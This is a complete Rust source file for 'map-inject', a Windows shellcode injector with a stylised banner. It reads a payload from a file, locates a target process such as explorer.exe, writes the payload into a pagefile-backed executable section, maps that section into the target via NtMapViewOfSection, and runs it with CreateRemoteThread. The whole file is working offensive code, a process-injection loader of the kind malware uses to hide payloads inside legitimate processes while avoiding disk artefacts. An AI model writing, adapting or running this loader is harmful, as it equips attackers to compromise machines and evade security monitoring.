//! Improved Injector using NtMapViewOfSection
//! Based on the working technique from injector_poly.c

use anyhow::{Result, bail};
use clap::Parser;
use colored::Colorize;
use std::ffi::c_void;
use std::fs;
use std::ptr;

use windows::Win32::Foundation::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Diagnostics::ToolHelp::*;
use windows::core::PCSTR;

// NT Types
type NTSTATUS = i32;
type ULONG_PTR = usize;
type SIZE_T = usize;
type ULONG = u32;
type PLARGE_INTEGER = *mut i64;

const STATUS_SUCCESS: NTSTATUS = 0;

// NtMapViewOfSection disposition
const VIEW_SHARE: u32 = 1;
const VIEW_UNMAP: u32 = 2;

#[repr(C)]
#[allow(non_snake_case)]
struct OBJECT_ATTRIBUTES {
    Length: ULONG,
    RootDirectory: HANDLE,
    ObjectName: *mut u8,
    Attributes: ULONG,
    SecurityDescriptor: *mut c_void,
    SecurityQualityOfService: *mut c_void,
}

// Function pointer types
type FnNtMapViewOfSection = unsafe extern "system" fn(
    SectionHandle: HANDLE,
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    ZeroBits: ULONG_PTR,
    CommitSize: SIZE_T,
    SectionOffset: PLARGE_INTEGER,
    ViewSize: *mut SIZE_T,
    InheritDisposition: u32,
    AllocationType: ULONG,
    Win32Protect: ULONG,
) -> NTSTATUS;

type FnNtUnmapViewOfSection = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut c_void,
) -> NTSTATUS;

#[derive(Parser, Debug)]
#[command(name = "map-inject")]
#[command(about = "Section mapping based injector")]
struct Args {
    /// Shellcode file path
    #[arg(short, long)]
    shellcode: String,

    /// Target process ID (0 = find explorer.exe)
    #[arg(short, long, default_value = "0")]
    pid: u32,

    /// Target process name (if pid is 0)
    #[arg(short, long, default_value = "explorer.exe")]
    name: String,
}

fn print_banner() {
    println!("{}", r#"
 ███╗   ███╗ █████╗ ██████╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
 ████╗ ████║██╔══██╗██╔══██╗    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
 ██╔████╔██║███████║██████╔╝    ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   
 ██║╚██╔╝██║██╔══██║██╔═══╝     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   
 ██║ ╚═╝ ██║██║  ██║██║         ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝         ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   
    "#.bright_cyan());
    println!("  {} {}\n", "NtMapViewOfSection Injector".bright_yellow(), "v1.0.0".white());
}

fn find_process(name: &str) -> Result<u32> {
    println!("{} Looking for process: {}", "[*]".bright_blue(), name);
    
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        
        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };
        
        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                let process_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy();
                
                if process_name.eq_ignore_ascii_case(name) {
                    CloseHandle(snapshot).ok();
                    println!("{} Found {} with PID: {}", "[+]".bright_green(), name, entry.th32ProcessID);
                    return Ok(entry.th32ProcessID);
                }
                
                if Process32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        
        CloseHandle(snapshot).ok();
    }
    
    bail!("Process {} not found", name)
}

fn inject_with_section_mapping(pid: u32, shellcode: &[u8]) -> Result<()> {
    println!("{} Starting section mapping injection to PID: {}", "[*]".bright_blue(), pid);
    
    // Get NtMapViewOfSection from ntdll
    let ntdll = unsafe { 
        windows::Win32::System::LibraryLoader::GetModuleHandleA(PCSTR::from_raw(b"ntdll.dll\0".as_ptr()))?
    };
    
    let nt_map_addr = unsafe {
        windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll, 
            PCSTR::from_raw(b"NtMapViewOfSection\0".as_ptr())
        )
    };
    
    let nt_unmap_addr = unsafe {
        windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            PCSTR::from_raw(b"NtUnmapViewOfSection\0".as_ptr())
        )
    };
    
    if nt_map_addr.is_none() {
        bail!("Failed to get NtMapViewOfSection");
    }
    
    let nt_map: FnNtMapViewOfSection = unsafe { std::mem::transmute(nt_map_addr.unwrap()) };
    let _nt_unmap: FnNtUnmapViewOfSection = unsafe { std::mem::transmute(nt_unmap_addr.unwrap()) };
    
    println!("{} Got NtMapViewOfSection at {:p}", "[+]".bright_green(), nt_map as *const ());
    
    // Open target process
    let process = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, pid)?
    };
    println!("{} Opened process: {:?}", "[+]".bright_green(), process);
    
    // Create file mapping backed by pagefile (doesn't touch disk)
    let mapping = unsafe {
        CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            Some(ptr::null()),
            PAGE_EXECUTE_READWRITE,
            0,
            shellcode.len() as u32,
            PCSTR::null(),
        )?
    };
    println!("{} Created file mapping: {:?}", "[+]".bright_green(), mapping);
    
    // Map into our process to write shellcode
    let local_view = unsafe {
        MapViewOfFile(
            mapping,
            FILE_MAP_WRITE,
            0,
            0,
            shellcode.len(),
        )
    };
    
    if local_view.Value.is_null() {
        unsafe { 
            CloseHandle(mapping).ok();
            CloseHandle(process).ok();
        }
        bail!("MapViewOfFile (local) failed");
    }
    println!("{} Mapped local view at: {:p}", "[+]".bright_green(), local_view.Value);
    
    // Copy shellcode to mapped memory
    unsafe {
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_view.Value as *mut u8,
            shellcode.len(),
        );
    }
    println!("{} Copied {} bytes to local view", "[+]".bright_green(), shellcode.len());
    
    // Unmap local view
    unsafe {
        UnmapViewOfFile(local_view).ok();
    }
    
    // Map into target process
    let mut remote_view: *mut c_void = ptr::null_mut();
    let mut view_size: SIZE_T = 0;
    
    let status = unsafe {
        nt_map(
            HANDLE(mapping.0),
            process,
            &mut remote_view,
            0,              // ZeroBits
            0,              // CommitSize
            ptr::null_mut(), // SectionOffset
            &mut view_size,
            VIEW_UNMAP,     // InheritDisposition
            0,              // AllocationType
            0x20,           // PAGE_EXECUTE_READ
        )
    };
    
    unsafe { CloseHandle(mapping).ok(); }
    
    if status != STATUS_SUCCESS {
        unsafe { CloseHandle(process).ok(); }
        bail!("NtMapViewOfSection failed with status: {:#x}", status);
    }
    
    println!("{} Mapped remote view at: {:p} (size: {})", 
        "[+]".bright_green(), remote_view, view_size);
    
    // Wait for CLR to initialize (important for .NET payloads)
    println!("{} Waiting 2000ms for CLR initialization...", "[*]".bright_blue());
    std::thread::sleep(std::time::Duration::from_millis(2000));
    
    // Create remote thread
    println!("{} Creating remote thread...", "[*]".bright_blue());
    
    let mut thread_id = 0u32;
    let thread = unsafe {
        CreateRemoteThread(
            process,
            Some(ptr::null()),
            0,
            Some(std::mem::transmute(remote_view)),
            Some(ptr::null()),
            0,
            Some(&mut thread_id),
        )?
    };
    
    println!("{} Thread created - TID: {}", "[+]".bright_green(), thread_id);
    
    // Monitor for a bit
    for i in 1..=5 {
        std::thread::sleep(std::time::Duration::from_millis(500));
        
        let exit_code = unsafe {
            let mut code = 0u32;
            GetExitCodeThread(thread, &mut code).ok();
            code
        };
        
        if exit_code == 259 { // STILL_ACTIVE
            println!("{} Thread still running (check {}/5)", "[*]".bright_blue(), i);
        } else {
            println!("{} Thread exited with code: {}", "[!]".bright_yellow(), exit_code);
            break;
        }
    }
    
    // Check if process is still alive
    let process_exit = unsafe {
        let mut code = 0u32;
        GetExitCodeProcess(process, &mut code).ok();
        code
    };
    
    if process_exit == 259 {
        println!("{} Process is still alive", "[✓]".bright_green());
    } else {
        println!("{} Process exited with code: {}", "[✗]".bright_red(), process_exit);
    }
    
    unsafe {
        CloseHandle(thread).ok();
        CloseHandle(process).ok();
    }
    
    Ok(())
}

fn main() -> Result<()> {
    print_banner();
    
    let args = Args::parse();
    
    // Read shellcode
    println!("{} Reading shellcode from: {}", "[*]".bright_blue(), args.shellcode);
    let shellcode = fs::read(&args.shellcode)?;
    println!("{} Shellcode size: {} bytes", "[+]".bright_green(), shellcode.len());
    
    // Print first 32 bytes
    println!("{} First 32 bytes:", "[*]".bright_blue());
    for (i, b) in shellcode.iter().take(32).enumerate() {
        print!("{:02x} ", b);
        if (i + 1) % 16 == 0 {
            println!();
        }
    }
    println!();
    
    // Find target PID
    let pid = if args.pid == 0 {
        find_process(&args.name)?
    } else {
        args.pid
    };
    
    // Inject
    inject_with_section_mapping(pid, &shellcode)?;
    
    println!("\n{} Done!", "[+]".bright_green());
    
    Ok(())
}
